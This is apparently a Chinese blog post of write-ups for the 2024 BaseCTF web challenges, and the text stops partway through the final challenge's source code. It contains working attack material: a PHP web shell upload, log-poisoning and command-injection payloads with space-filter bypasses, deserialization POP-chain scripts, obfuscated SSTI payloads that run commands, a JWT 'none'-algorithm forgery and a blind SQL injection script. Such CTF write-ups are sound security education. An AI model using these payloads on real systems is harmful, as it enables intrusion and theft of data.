---
title: '2024 BaseCTF WEB Writeup'
description: '略 具体 HTTP header 可参考 HTTP  MDN mozilla.orghttps://developer.mozilla.org/zh-CN/docs/Web/HTTP'
pubDate: 2024-10-15
author: 'IHK-1'
tags: ['CTF', 'BaseCTF', 'WEB', '2024']
---

# WEEK 1
## A Dark Room
F12 查看页面

<!-- 这是一张图片，ocr 内容为：</>元素 控制台 源代码 欢迎 一个衣衫槛楼的陌生 <!DOCTYPE HTML> 满蹴地步入门来,瘫 <HTML ITEMSCOPE ITEMTYPE-"HTTPS://SCHEMA.ORG/CREATIVEWORK"> 落里 <HEAD> <BODY STYLE> 房间很冷. <DIV ID-"WRAPPER"> 火光映出窗外,投入 <DIV ID-"SAVENOTIFY" STYLE-"OPACITY:O;">>> <DIV ID-"CONTENT"> 中. <DIV ID-"OUTERSLIDER"> 火堆燃烧着. ><DIV ID-"MAIN"></DIV> </DIV> 火堆熄灭了. </DIV> ><DIV ID-"NOTIFICATIONS" CLASSNAME-"NOTIFICATIONS">@>@></DIV> 房间寒冷刺骨. </DIV> <!- FLAG: BASECTF{15679E69-170C-4B23-A59C-8937A1389009> --> <DIV CLASS"MENU">>DIV> </BODY> </HTML> -->


## HTTP 是什么
略 具体 HTTP header 可参考 [HTTP | MDN (mozilla.org)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP)

## MD5 软绕过
弱比较：md5 0e特性

强比较：数组绕过

<!-- 这是一张图片，ocr 内容为：DUD: HIGHLIGHT_FILE(_FILE__);  ERROR_REPORTING(0); FLAG.PHP REQUIRE  ISSET($_POST[PASSWORD2'])  ){ "]) ISSET($_POST[ PASSWORD']) && ISSET($_GET['NAME2']] (ISSET($ GET[' &&IS IF NAME $NAME $_GET NAME $_GET['NAME2']; $NAME2 $_POSTL PASSWORD']; FPASSWORD $_POST['PASSWORD2'] $PASSWORD2 MD5($PASSWORD)){ MD5($NAME) $PASSWORD D &&& SNAME 15($NAME2)  -: MD5($PASSWORD2))L ($NAME2 MD5($ 三三 IF && $PASSWORD2 $F1AG: ECHO ELSE I "再看看啊,马上绕过哟!"; ECHO 了 ELSE "错啦错啦" ECHO ELSE [ 没看到参数呐"; ECHO - BASECTF{590C3853-0383-4D5E-B106-CB22FC9B2BA; 匹配变音符号() 全词匹配(W) DISABLE F 区分大小写(C) 第1项,共找到1个四配项 高亮全部(A) 目存储于无障碍环境 888 应用程序 口调试器仪网络{}样式编辑器 下内存 性能 查看器 HACKBAR 控制台 MAX HACKBAR OTHER SQL WAF LFI PASSCODE ERROR BASED BYPASSER LDAP XSS VARIABLES LOAD URL HTTP://CHALLENGE.BASECTFUN:41861/ZNAME-S878926199A&NAME2"1 SPLIT URL EXECUTION REFERRER POST DATA URL REVERSE HEX OXHEX MD5 BASE64 POST DATA PASSWORD-S155964671A&PASSWORD2"-2 -->


## upload
无任何前端过滤，上传 php 一句话木马，访问 uploads/filename 访问即可

<!-- 这是一张图片，ocr 内容为：BURP SUITE专业版 V2024.21-临时项目 查看 目- LICENSED TO LEON406 开始出力 电放器 O搜素尚设置 对比工具 日志 扩展 学习 王故崇 工具工具 代 COLLABORATOR HTTP/1  41 目标:HTTP//CHALLENGE.BASECTF.FUN:30656 V 发送 现好货 川 @X INSPECTOR 请求 10          0  历求国性 美化 页面渲染 美化 DQDE> 请求查问参数 1 ((C,OT7) 4ACCEPE: 请求主体会致 四等记 5 ACCEPL-LANQUAQE:GA-CH,G-0.2 请求COOKLES W.W.W.W-TYBDATERTHATELLIPATE/TOTM-HATE SELLETEPSELLEDCUPHAME'L; BOUADAEY-------------------------------13357198129750466435410736 请求头 8 COPTENT-LENGTH:245 OXIGIN:HSTPI//EHALLENGE.BASECT.TUN:30656 (SELLEELOK MUM O)( 0 CONAECTION:CLOGE (LMWUNTTSS "  /EPMOTON,- NOTAPURAPS BEFEXES: ATEP://CBALLENGE BASECTT.TUN:30256/ UPGREDE-INSECUCE-BEQUEST8:1 ECHO 'ELLE UPLOADED SUCOEGELULLY'I PXLORISY:U-O,I ECHO ' ZROR UPLEADLNG ELLE'P 2----------------------------1335719811981397504664343410736 CONTENS-DISPOSITIOSI : FORM-DATA; NAME-WFILE"; FILENAME-"SHELL.UBY CONSENS-TYPE:IMAGE/PNG AM <10007YBE HUNL> <?PBP BEVAL($_POST(SBELL)/2> CHETE CHERSEC-OUTE-8"> <MELA NAMESNVIEMPORTW CONLENG-"WIDUH-DEVICE-WIDEH, INLUSAL-80816-1.09> <T162E>上传你喜欢的图片吧!</616.616> </HEAG> <000Y> <EOEM SCTLON-NR MECHOD- GO8T. ENGTYPE- MULEIPERT/FORA-DETA97 HTTTTAMAMEU ATTSWMADAANDUT> SBUSEN TYP TYGE "SUBMIS>上传/BUSTON> <PBHP SCONDLE(UPLCADE') TOKENGEL LATERESTERENEALL...... O "ZING ASQ-'UPLONDE/SESLEN ATYLE-\MMEX-HELQHTI 200PX/\N />N: ?7 </HONL> FILE UPLOADED SUCCESSFULLY 选择文件 未过停任何支件 搜索 0高亮 6,092字节|28MILLIS 完成 EVENT LOG(4) -->


<!-- 这是一张图片，ocr 内容为：中国蚁剑 X ANTSWORD编辑窗口调试 设置 分类目录(1) 三数据管理(50) 添加 A重命名 删除 URL.地址 IP地 添加数据 X口X 口默认分类 52.17 HTTP: :测试连接 X清空 添加 HTTP: 1.14. I基础配置 1.14. HTTP: 39.10 HTTP URL地址 HTTP://CHALLENGE.BASECTF.FUN:30656/UPLOADS/SHELL.PHP HTTP: 39.10 连接密码 SHELL HTTP: 39.96 网站备注 HTTP: 127.C 编码设置 UTF8 31.6G HTTP: 连接类型 PHP 127.C HTTP: 编码器 HTTP: 1.14. DEFAULT(不推荐) 192.1 HTTP: BASE64 192.1 HTTP: CHR 192.1 HTTP: 192.1 HTTP: E 请求信息 1.14. HTTP: HTTP: 2024/07/16 22:08:02 HTTP: 成功 连接成功! 2024/07/15 HTTP: 2024/07/15 21:08:11 HTTP: -->


<!-- 这是一张图片，ocr 内容为：中国蚁剑 编辑窗口调试 ANTSWORD 27.25.151.199 编辑:/FLAG /FLAG 12 BASECTF{8251D091-0B33-440C-A189-ECB981C022F2] -->


## 喵喵喵´•ﻌ•`
RCE 命令执行，使用 system 进行命令执行即可

<!-- 这是一张图片，ocr 内容为：<?PHP FILE HIGHLIGHT_FILE( ERROR_REPORTING(0); $A  - $_GET['DT']; EVAL(SA); ?>BASE :BASECTF2AE1F8D1-210F-439E-AD34-E549C0EF3434) 匹 在此页面中查找 区分大小写(C) 高亮全部(A) \网络{}样式编辑器 口调试器 查看器 汇内存 性能 控制台 WAF XSS SQL ERROR BASED LDAP LFI VARIABLES LOAD URL HTTP://CHALLENGE.BASECTF.FUN:46149/2DT-SYSTEM('CAT/F*); 22% SPLIT URL EXECUTION -->


# WEEK 2
## ez_ser
反序列化 pop 链分析：

web::__wakeup() --> re::__toString() --> pwn::__get() --> Misc::getflag()

代码如下：

```php
<?php
  class re{
  public $chu0;
  }

  class web {
    public $kw;
public $dt;
}

class pwn {
  public $dusk;
  public $over;
}


class Misc {
  public $nothing;
  public $flag;
}

$a = new Misc();

$b = new pwn();
$b -> over = $a;

$c = new re();
$c -> chu0 = $b;

$d = new web();
$d -> kw = $c;

echo serialize($d);
?>
```

<!-- 这是一张图片，ocr 内容为：S_GET SER $SER UNSERIALIZE($SER); 2> 什么,你竟敢不认可?BASECTFI5542186A-1ECA-4933-A7B0-188B1707EE3A] -->


## RCEisamazingwithspace
<!-- 这是一张图片，ocr 内容为：<?PHP HIGHLIGHT FILE( FILE $CMD $_POST[ CMD IF THE COMMAND CHECK IS 1N PRESENT SPACE IF IN CHECK THE SPACE PRESENT TO COMMAND USE OT PR6 $CMD) IF /S/ (PREG_MATCH ALLOWED ECHO COMMAND SPACE HOT EXIT: EXECUTE THE COMMAND SYSTEM($CMD): -->


代码只过滤了空格，system 函数相当于在系统以命令执行的方式执行指定内容，所以思路是找到可以在 系统 上等效 空格的字符

<!-- 这是一张图片，ocr 内容为：8.空格绕过 ${IFS} $IFS$9 $IFS$1 重定向替代空格 重定向替代空格 花括号 {CAT,FLAG.TXT} TAB符号绕过 60% 16进制 X-$'CAT|X20/ETC/PASSWD'&&$X 换行拼接 CATL FLAG,TXT -->


在此我用 ${IFS} 进行空格替换

<!-- 这是一张图片，ocr 内容为：<?PHP HIGHLIGHT_ _FILE( FILE 三 $_POST[ CMD' $CMD IF IN THE CHECK COMMAND S PRESENT SPACE IF IN IS THE CHECK PREG_MATCH TO COMMAND PRESENT SPACE USE O士 IF $CMD) (PREG_MATCH( / S/,  ECHO SPACE A110WED COMMAND IN NOT EXIT; THE EXECUTE COMMAND SYSTEM($EMD): BASECTFDEB5EFDE-7CDC-4B85-9AB0-5D2EDE66643A6) 高亮全部(A) 区分大小写(C) 在此页面中查找 匹配变音符号() 无P 仪网络 样式编辑器 口调试器 查看器 心内存 存储 控制台 性能 SQL WAF XSS VARIABLES ERROR BASED LFI LDAP BYPASSER HTTP://CHALLENGE.BASECTF.FUN:25606/ LOAD URL 222 SPLIT URL EXECUTION POST DATA REFERRER BASE6 HEX REVERSE POST DATA CMDCAT${IFS}/FLAG -->


## Really EZ POP
分析反序列化链子：

Nature::__destruct --> Sea::__get --> Shark::__invodke() --> Sink::__toString()

但是私有属性需要手动在类中复制，我们可以构建 __construct 初始化函数在 初始化时进行赋值

```php
<?php

class Sink
{
    private $cmd = "system('cat\${IFS}/flag');";
}

class Shark
{
    private $word;
    public function __construct()
    {
        $this->word = new Sink();
    }
}

class Sea
{
    public $animal;
}

class Nature
{
    public $sea;
}

$a = new Shark();

$b = new Sea();
$b->animal = $a;

$c = new Nature();
$c->sea = $b;

echo urlencode(serialize($c));
?>
```

同时需要注意，urlencode 时，会将空格转换为 + 号，命令执行时候会执行失败，可以搭配 RCEisamazingwithspace 的 ${IFS} 进行命令执行

<!-- 这是一张图片，ocr 内容为：POST IF NATURE UNSERIALIZE($_POST['NATURE'L 川 SNATURE BASECTF9247AEFC-6C35-469B-87FB-3F296772F4D6> 匹配变音符号() 区分大小写(C) 全词匹配(W) 高亮全部(A) 在此页面中查找 习 性能非内存储 中查看器 无障碍环境 控制台 应用程序 MAX HACK 心网络 样式编辑器 调试器 HACKBAR LOAD URL HTTP://CHALLENGE.BASECTF.FUN:34955/ SPLIT URL EXECUTE CLEAR ALL USER AGENT O KIES POST DATA REFERER ADD"I 0%2FFLAG%27%29%3B%22%3B%7D%7D%7D -->


## 一起吃豆豆
看页面推测为纯前端 js 页面，所以直接分析其前端 js 代码即可，虽然F12 并不起作用，但是可以尝试手动点击浏览器的开发选项查看源代码

搜索结束时，发现解码了 flag 的 base64

<!-- 这是一张图片，ocr 内容为：内存 小性能 飞源代码 & 网络 控制台 应用程序 ()欢迎 </)元素 工作区 页面 爱盖 CAEFAC6D-686C-4.-C-DF2F798074FD INDEXJS 1030 CHALLENGE BASECTF.FUN44693 ) (密引) 1032 HO; 2  CAEFAC6D-686C-428B-B30C-DI2F980745D /结束画面 1034 GAMEJS 1035 (FUNCTION () ( INDERCJS 1036 VAF STAGE - GANE.CREATESTAGE(); 1037 //游戏结束 STAGE.CREATEITEM(F 1039 X: GANE.WIDTH / 2, Y: GANE.HEIGHT*.35, 1041 DROW:FUNCTION(CONTEXT)( 1042 CONTEXT.FILLSTYLE A 'AFF'; 1043 CONTEXT.FANT ; 'BOLD 20PX PRESSSTART2P'; PAC-M 1044 CONTEXT.TEXTALIGN ; 'CENTER'S CANLAWL FAYTGSCOLING--IMIDDLALLALLALL 1045  CONTEXT,FILLTEXT(LIFE ? ATOB("GNFZZUNURNTKNNYNYNYNOZXZFZXZFZXZUHC3LFADRJAYEHFQ-") ;'GAME OVER" 1046 1047 ); 1048 //记分 1049 PRESS ENTER TC 1058 1051 X:GOME.WIDTH/2. Y; GANE.HEIGHT * .5, 1053 DRANE FUNCTION(CONTEXT)( 1054 CONTEXT.FILLSTYLE 1055 CONLEXT,FONT " '20PX PRESSTART2P'; 1056 CONTEXT.FILLTEXT(FINAL SCORE:'' * (SCORE `  50*  NATH.MATH.MATH.MATH.  2)), THIS.X,THIS.Y); 1068 ); //事件绑定 1061 STAGE.BIND(*KEYDOWN', FUNCTION (E) ( 1062 1063 SWITCH(E.KEYCODE)( COSE 13://回车 按[空格键]智停或 PRESS [SPACE] TO PAUSE OF 这款吃豆人游戏的开发是我在学习和探索HTML5游戏的一次尝试,也是对这款 爱盖范围不适用 子,在移植关卡和玩法规则的同时,在游戏中加入了游戏角色动画管理和幽灵的答能 自动垃充 搜密 问题 控制台 这些精灵似乎很有想法,它们知道如何彼此协作对你穷追不舍. 如果你对比感兴趣,可以在GITHUB上关注此项目,我希望能通过游戏和代码与体 京 算选器 默认级别 TOP -->


<!-- 这是一张图片，ocr 内容为：RECIPE INPUT OMFZZUNURNTKNV9NYWOZXZFZX2VHC31FDDBFADRJAYEHFQ-- FROM BASE64 ALPHABET A-ZA-ZO-9+/三 OUTPUT BASECTF{J5_GAM3_1S_EASY_TO_H4CK!!] STRICT MODE REMOVE NON-ALPHABET CHARS -->


## 你听不到我的声音
无回显 RCE，一般是尝试反弹 shell ，不过 反弹shell 需要 & 符号，urlencode 之后也没弹出来，尝试另一个思路，直接将 flag 输出到网站目录下，访问拿到 flag

<!-- 这是一张图片，ocr 内容为：<?PHP HIGHLIGHT_FILE(_FILE___);  SHELL_EXEC($_POST['CMD']); 日存储 样式编辑器 竹网络 口调试器 非内存 控制台 性能 口查看器 ENCRYPTION LFI XXE XSS ENCODING SQL OTHER LOAD URL HTTP://CHALLENGE.BASECTF.FUN:41630/ 88 SPLITURL EXECUTE CLEAR POST DATA USER AGENT REFERER COOKIES ADD"I CMDCAT/FLAG>OUT -->


<!-- 这是一张图片，ocr 内容为：A介 电动中部 下载 OUT 打开文件 查看更多 -->


<!-- 这是一张图片，ocr 内容为：OUT 查看 文件编辑 BASECTE{6D5B17A1-1043-4E19-927E-10746212F836; -->


## 所以你说你懂 MD5? 
第一层 md5 数组绕过

第二层 md5 0e绕过

第三层 md5 强碰撞

第四层 md5 哈希长度拓展攻击

## 数学大师
简单的交互逻辑，EXP 如下：

```python
import requests
import re

url = "http://challenge.basectf.fun:38637/"
session = requests.Session()

response = session.get(url).text
question = re.search(r'Your score is reset to (.*)Tell me in 3 second (.*)\?', response).group(2)
answer = eval(question.replace('÷', '//').replace('×', '*'))

while True:
    response = session.post(url, data={"answer": int(answer)}).text
    try:
        question = re.search(r'Your score is now (.*)Tell me in 3 second (.*)\?', response).group(2)
        answer = eval(question.replace('÷', '//').replace('×', '*'))
    except:
        print(response)
        exit()
```

# WEEK3
## ez_php_jail
第一层 Jail_by.Happy 利用 php 正则特性，Jail[by.Happy 即可传参



所以现在需要绕过 a c s 三个字符，以及如何读取到 /flag 的文件，因为 phpinfo 中一堆命令执行函数被禁止，所以读取文件更加方便，以下为基础思路

```plain
读取文件函数("/flag")
```

发现很多读取文件函数的函数名中包含了 acs ，但是 file，highlight_file 并没有，但是 file 在 phpinfo 中函数被禁止，所以使用 highlight_file

接下来就是构造 /flag 了，其中只有 a 需要绕过，我们尝试直接从环境变量中找到字符并拼接，get("PWD") 回显 /var/www/html ，所以拿到了 a 这个字符，拼接以下即是 "/fl".getenv("PWD")[2]."g"



完整 payload：

```plain
http://challenge.basectf.fun:41846/?Jail[by.Happy=highlight_file("/fl".getenv("PWD")[2]."g");
```

<!-- 这是一张图片，ocr 内容为：WELCOME TO MY JAIL BASECTF[FE30D924-3863-4CC7-9099-4F011307EBF4] YES! YOU ESCAPED FROM THE JAIL! LOL! 区分大小写(C) 全词匹配(W) 四配变音符号() 高亮全部(A) 无障碍环境 心内存目存储 应用 BO查看器 样式编辑器 竹网络 调试器 控制台 性能 ENCRYPTION LFI ENCODING OTHER XSS SQL XXE V HTTP://CHALLENGE.BASECTF.FUN:41846/?JAILLBY.HAPPY-HIGHT FILE("G"; LOAD URL SPLIT URL -->


## 复读机
<!-- 这是一张图片，ocr 内容为：请求 响应 RAWHEX页面渲染 美化 美化 RAW HEX HTTP/1 1 200  0K POST/FLAG H HTTP/1.1 SERVER:VERKZEUG/3.0.4 PYTHON/3.10.14 HOST:CHALLENGE.BASECTF.FUN:46391 USER-AGENT: HOZILLA/S.0 (WINDOWS NT 10.0; WIN64; X64; RV:130.0) DATE:HON,16 SEP 2U24 16:39:45 GMT GECKO/20100101 FIREFOX/130.0 CONTENT-TYPE:TEXT/HTML;CHARSET-8 5678 ACCEPT:*/* CONTENT-LENGTH:9 ACCEPT-LANGUAGE: CONNECTION: CLOSE |ZH-CN,ZH;Q-0.8,ZH-TW;Q-0.7,ZH-HK;Q-0.5,EN-US;Q-0.3,EN;Q-0.2 ACCEPT-ENCODING: GZIP, DEFLATE, BR BASECTF() CONTENT-TYPE: APPLICATION/X-WWW-FORM-URLENCODED CONTENT-LENGTH:14 8CC 9 ORIGIN:HTTP://CHALLENGE.BASECTF.FUN:46391 10 CONNECTION: CLOSE 11 REFERER:HTTP://CHALLENGE.BASECTF.FUN:46391/ 12 PRIORITY: U-0 13 14 FLAGBASECTF() -->


看到 flask 的特征，推测为 SSTI，尝试了 {{ }} 发现被过滤了，可以使用 {% print() %} 

以下为尝试被过滤的内容：

```plain
". __ 被过滤
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']())%}
```

写个 SSTI 进行过滤

<!-- 这是一张图片，ocr 内容为：SSTI E:\PYTHON\PYTHON39\PYTHON.EXE C:\USERS\HR\DESKTOP\PYTHONMISC\SSTI-PY  114  <CLASS 'POSIX.SCANDIRITERATOR'> 115  <CLASS 'POSIX.DIRENTRY'>  <CLASS 'OS._WRAP_CLOSE' 137 'TEMPFILE._TEMPORARYFILECLOSER'> 304 <CLASS 346 <CLASS 'WERKZEUG.WSGI.CLOSINGITERATOR'> -->


发现 137 又 os._wrap_close ，有模板可以进行注入

完整 payload 如下：

```plain
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('whoami')['rea''d']())%}
```

其中 / 被过滤了，可以截取 PWD 第一位

```plain
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('a=`pwd`;a=`substr $a 1 1`;cd $a;cat flag')['rea''d']())%}
```

## 滤个不停
根据要求包含的字符可以推测是日志文件包含，先访问 /<?php system($_POST[shell]);?> 当包含日志时，会当作代码执行

<!-- 这是一张图片，ocr 内容为：项目 查看 帮助 重放器 BURP SUITE专业版V2024.2.1-临时项目-LICENS BURP INTRUDER 日志扩展学习 对比工具 编码工具 目标 仪表盘 重放器 COLLABORATOR SEQUENCER INTRUDER 代理设置 HTTP历史记录 WEBSOCKET历史记录 拦截 请求HTTP://CHALLENGE.BASECTF.FUN:41077 [27.25.151.199] 打开内嵌浏览器 拦截已开启 操作 放行 丢弃 美化 RAW HEX GET /<?PHP SYSTEM($ POST[SHELL];?>>> HT HTTP/1.1 HOST:CHALLENGE.BASECTF.FUN:41077 USER-AGENT: MOZ1LA/5.0 (UINDOVS UT 10:0:0: W1DE4; XE9; XE9; EV:130:0) GECKO/ZOIDL PITEFOX/13D.O 34567890 LAEEPE: TEX5/BEMT,   PPLIEATION/XBEMITZM),APPLICASTON/&MLIGN) LACCEPE-LANGUAGE; ZH-CN,ZHIQE0.8,ZH-TW;QE0.7,2H-HK:QF0.5,EN-US;QF0:3,ENIQF0.2 ACCEPT-ENCODING: GZIP, DEFLATE, BR CONNECTION: CLOSE UPGRADE-INSECURE-REQUESTS: 1 PRIORITY:U-O, I -->


<!-- 这是一张图片，ocr 内容为：--10.32:00--[16/SEP/2024:22:41:10 +0800)'POST/HTTP/1.1' 200 9739'HTTP//CHA 口 高全部 BASECTFF 每1项,共找到1个西配项 四包变音符号() 区分大小马(G) 目存储 0内存 查看器 HACKBAR 卡 无障码环境 路应用程序 Q微信公众号:江南小虫虫HACKBAR V2 XSSLFIFIXXE OTHER* ENCRYPTION HTTP://CHALLENGE.BASECTT.FUN.41077/ LOAD URL SPIIT URL POST DATA " REFER 口 USER AGENT O KOOKIES INCOMPELENT-HELLOWORIDSDALCHENARLLOGHNGINS/ACCESS JOG&SHELFCAT /TAG -->


## 玩原神玩的
第一层 sizeof 是判断数组长度的，所以可以使用 len[] 进行传参数组

payload：

```plain
len[]=0&len[]=1&len[]=2&len[]=3&len[]=4&len[]=5&len[]=6&len[]=7&len[]=8&len[]=9&len[]=10&len[]=11&len[]=12&len[]=13&len[]=14&len[]=15&len[]=16&len[]=17&len[]=18&len[]=19&len[]=20&len[]=21&len[]=22&len[]=23&len[]=24&len[]=25&len[]=26&len[]=27&len[]=28&len[]=29&len[]=30&len[]=31&len[]=32&len[]=33&len[]=34&len[]=35&len[]=36&len[]=37&len[]=38&len[]=39&len[]=40&len[]=41&len[]=42&len[]=43&len[]=44
```

进入 tip 进行 get 传参 ?tip=我要玩原神

进入 dumpFlag 函数，POST 传参二维数组，其中 第一个传参 100% 第二个传参 "love100%" . md5($a) 即：love100%30bd7ce7de206924302499f197c7a966，但是这里设了小坑，100% 拼接后面 30xxxx 会被url 编码 即 100 + %30 ，所以 100% 需要进行 url 编码

payload：

```plain
m[]=100%25&m[]=love100%2530bd7ce7de206924302499f197c7a966
```

最后返回每个字符的 md5 异或 位数，写个脚本即可

exp：

```python
import hashlib

md5_list = ["3295c76acbf4caaed33c36b1b5fc2cb1", "26657d5ff9020d2abefe558796b99584", "73278a4a86960eeb576a8fd4c9ec6997",
            "ec8956637a99787bd197eacd77acce5e", "e2c420d928d4bf8ce0ff2ec19b371514", "43ec517d68b6edd3015b3edc9a11367b",
            "ea5d2f1c4608232e07d3aa3d998e5135", "c8ffe9a587b126f152ed3d89a146b445", "f457c545a9ded88f18ecee47145a72c0",
            "03afdbd66e7929b125f8597834fa83a4", "072b030ba126b2f4b2374f342be9ed44", "5f93f983524def3dca464469d2cf9f3e",
            "65b9eea6e1cc6bb9f0cd2a47751a186f", "66f041e16a60928b05a7e228a89c3799", "72b32a1f754ba1c09b3695e0cb6cde7f",
            "03afdbd66e7929b125f8597834fa83a4", "7f39f8317fbdb1988ef4c628eba02591", "6364d3f0f495b6ab9dcf8d3b5c6e0b01",
            "7f6ffaa6bb0b408017b62254211691b5", "19ca14e7ea6328a42e0eb13d585e4c22", "182be0c5cdcd5072bb1864cdee4d3d6e",
            "9f61408e3afb633e50cdf1b20de6f466", "e369853df766fa44e1ed0ff613f563bd", "1c383cd30b7c298ab50293adfecb7b18",
            "c8ffe9a587b126f152ed3d89a146b445", "202cb962ac59075b964b07152d234b70", "b53b3a3d6ab90ce0268229151c9bde11",
            "4c56ff4ce4aaf9573aa5dff913df997a", "a5bfc9e07964f8dddeb95fc584cd965d", "4c56ff4ce4aaf9573aa5dff913df997a",
            "3def184ad8f4755ff269862ea77393dd", "c0c7c76d30bd3dcaefc96f40275bdc0a", "70efdf2ec9b086079795c442636b55fb",
            "14bfa6bb14875e45bba028a21ed38046", "b6d767d2f8ed5d21a44b0e5886680cb9", "b6d767d2f8ed5d21a44b0e5886680cb9",
            "1f0e3dad99908345f7439f8ffabdffc4", "3c59dc048e8850243be8079a5c74d079", "70efdf2ec9b086079795c442636b55fb",
            "70efdf2ec9b086079795c442636b55fb", "35f4a8d465e6e1edc05f3d8ab658c551", "1ff1de774005f8da13f42943881c655f",
            "1f0e3dad99908345f7439f8ffabdffc4", "8e296a067a37563370ded05f5a3bf3ec", "43ec517d68b6edd3015b3edc9a11367b"]

flag = ""
for i in range(len(md5_list)):
    for num in range(128):
        if hashlib.md5(str(num).encode()).hexdigest() == md5_list[i]:
            flag = flag + chr(num ^ i)

print(flag)
```

# WEEK4
## no jwt
分析代码只有 JWT 是可控的

<!-- 这是一张图片，ocr 内容为：DECODED : JWT:DECODE(TOKEN.SPLITC+ ")(11), OPTIONS;(VERIFY-SIGNATURE;; FALSE, "VERIFY-EXP:: FALSED) 检查用户角色是否为ADMIN -->


其中解 JWT 时未对 JWT 有任何限制，搜索得知 JWT 攻击可以使用 none 算法

EXP：

```python
import jwt
import datetime

token = jwt.encode({'sub': "admin",'role': 'admin','exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)}, algorithm='none', key="").decode()
print(token)

```

<!-- 这是一张图片，ocr 内容为：请求 响应 M5川 美化 页面渲染 美化 HEX HEX RAW RAW OK GET /FLAG HTTP/1.1 HTTP/1.1  200  各2345 SERVER:WERKZEUG/3.0.4 PYTHON/3.8.19 HOST:CHALLENGE.BASECTF.FUN:27560 DATE:TUE, 17 SEP 2024 05:33:39 GMT USER-AGENT: HOZILLA/5.0 (WINDOWS NT 10.0; WIN64; X64; RV:130.0) CONTENT-TYPE:APPLICATION/JSON GECKO/20100101 FIREFOX/130.0 CONTENT-LENGTH:59 ACCEPT: 5678 TEXT/HTML,APPLICATION/XHTML+XML+XML,APPLICATION/XML:GEO.9,IMAGE/AVIE, IMAGE/UE CONNECTION: CLOSE BP.IMAGE/PNG,IMAGE/SVG+XML,*/*;Q-0.8 ACCEPT-LANGUAGE: "FLAG":"BASECTF(9BDOA2D3-B236-4627-8D98-F19C5519EB1D)\ ZH-CN,ZH;Q-0.8,ZH-TU;Q-0.7,ZH-HK;Q-0.5,EN-US;Q-0.3,EN;Q-0.2 ACCEPT-ENCODING: GZIP, DEFLATE, BR 9 CONNECTION: CLOSE UPGRADE-INSECURE-REQUESTS: 1 PRIORITY:U 0, AUTHORIZATION: TEST EYJOEXAIOIJKVIQILCJHBGCIOIJUB25LINO.EYJZQWIIOIJHZGLPBIISINJVBGTIOIJHZGIPH IIS IMV4CCI6HTCYNJUINDGXMHO. -->
  


## flag直接读取不就行了？
<!-- 这是一张图片，ocr 内容为：<?PHP  HIGHLIGHT_FILE('INDEX.PHP'): # 我把FLAG藏在一个SECRET文件夹里面了,所以要学会遍历啊"  ERROR_REPORTING(0); $JING $_POST['J']: $HONG $_POST['H']: $_GET['K']; $KENG $_GET['W']: $WANG - NEW $KENG($WANG): $DIR FOREACH($DIR $士) AS <BR>): ECHO($F $JING($HONG): ECHO NEW ?> -->


看特征为原生类利用，先查看 secret 在哪，使用 DirectoryIterator 进行目录遍历

<!-- 这是一张图片，ocr 内容为：<?PHP HIGHLIGHT_FILE(INDEX.PHP #我把FLAG藏在一个SECRET文件夹里面了,所以要学会遍历啊~ ERROR_REPORTING(0); $_POST['J']; $J1NG $HONG $_POST['H']: $KENG $_GET['K']; $WANG $_GET['W'];  NEW $KENG($WANG); $DIR REACH($DIR AS $F) [ ECHO($F . ' <BR>'); $JING($HONG); ECHO NEW ?> TMP MEDIA MNT HOME USR DEV ETC LIB SBIN BIN SRV 无障碍环境 代网络 非内存 口查看器 性能 应用程序 HACKBAR 存储 控制台 样式编辑器 调试器 MAX HACKBAR LFI ENCRYPTION SQL XSS XXE OTHER ENCODING LOAD URL HTTP://CHALLENGE.BASECTF.FUN:37881/?K-DIRECTORYLTERATOR&W SPLIT URL EXECUTE COOKIES CLEAR ALL REFERER POST DATA USER AGENT ADD " -->


<!-- 这是一张图片，ocr 内容为：<?PHP HIGHLIGHT_FILE( INDEX.PHP 我把FLAG藏在一个SECRET文件夹里面了,所以要学会遍历啊~ ERROR_REPORTING(0); $_POST['J']; $J1NG $_POST['H']; $HONG 川 二 $KENG $_GET[K'K'] $WANG - $_GET['W']; $DIR 二 $KENG($WANG); NEW FOREACH($DIR AS $F) ( ECHO($F . ' <BR>'); $JING($HONG); ECHO I NEW F11444G.PHP 休网络 口查看器 日存储 样式编辑器 应用程序 下内存 无障碍环境 调试器 控制台 性能 LFI XSS SQL ENCODING XXE OTHER ENCRYPTION LOAD URL HTTP://CHALLENGE.BASECTF.FUN:37881/2K-DIRECTORYLTERATOR&W-/SECRET 8 SPLIT URL EXECUTE CLEAR ALL POST DATA USER AQENT COOKIES REFERER ADD"I -->


最后使用 SplFileObject 原生类进行文件读取

<!-- 这是一张图片，ocr 内容为：<BODY> <CODE> <BR> <BR> F11444G.PHP <BR> <!--?PHP BASECTF{821037DA-E185-4BA6-942F-C8B4A3B91229] </BODY> </HTML> -->


payload：

```plain
GET ?K=DirectoryIterator&W=/secret
POST J=SplFileObject&H=/secret/f11444g.php
```

## only one sql
```plain
SHOW TABLES
  Tables_in_ctf 
  flag

SHOW COLUMNS FROM flag
  Field Type Null Key Default Extra 
  id varchar(300) YES NULL 
  data varchar(300) YES NULL 

UPDATE flag SET id=1 WHERE data LIKE 'B%' AND IF(data LIKE 'B%',sleep(1),1) // 这点是我没想到的，我还在 SUBSTR 进行切割
```

完整 EXP 如下：

```python
import requests
import time
import string

flag = "B"

while True:
    for word in string.ascii_letters + string.digits + "_.?!{}":
        tmp_flag = flag + word
        url = f"http://challenge.basectf.fun:27906/?sql=UPDATE flag SET id=1 WHERE data LIKE 'B%' AND IF(data LIKE '{tmp_flag}%',sleep(1),1)"

        start_time = time.time()
        response = requests.get(url)
        end_time = time.time()

        if (end_time - start_time) > 0.5:
            flag = tmp_flag
            print(flag)
            break
```

<!-- 这是一张图片，ocr 内容为：E:\PYTHON\PYTHON39\PYTHON.EXE C:\USERS\HK\DESKTOP\PYTHONMISC\TEST.PY BA BAS BASE BASEC BASECT BASECTF BASECTF_ BASECTF_4 BASECTF_49 BASECTF_49E BASECTF_49E8 BASECTF_49E81 BASECTF_49E819 -->


## 圣钥之战1.0
访问 read 路由拿到源代码

```python
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
